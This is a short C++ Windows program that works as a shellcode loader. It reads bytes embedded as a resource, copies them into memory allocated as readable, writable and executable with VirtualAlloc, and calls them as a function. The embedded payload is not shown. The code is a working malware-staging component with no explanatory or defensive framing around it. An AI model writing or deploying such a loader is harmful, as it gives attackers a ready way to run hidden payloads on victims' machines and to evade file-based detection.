

#include <iostream>
#include <Windows.h>
#include "stdio.h"
#include "resource.h"

typedef void (*ShellcodeFunction)();


int main()
{
    HRSRC hResource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hResource == NULL) {
        // Handle error
        return -1;
    }

    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (hLoadedResource == NULL) {
        return -1;
    }

    PVOID pShellcode = LockResource(hLoadedResource);
    if (pShellcode == NULL) {
        return -1;
    }

    SIZE_T sShellcodeSize = SizeofResource(NULL, hResource);
    if (sShellcodeSize == NULL) {
        return -1;
    }

    LPVOID pAllocateMemory = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pAllocateMemory == NULL) {
        return -1;
    }
    memcpy(pAllocateMemory, pShellcode, sShellcodeSize);
    ShellcodeFunction pShellcodeFunction = reinterpret_cast<ShellcodeFunction>(pAllocateMemory);

    
    pShellcodeFunction();

    // Clean up resources
    FreeResource(hLoadedResource);
    VirtualFree(pAllocateMemory, 0, MEM_RELEASE);

    return 0;
}


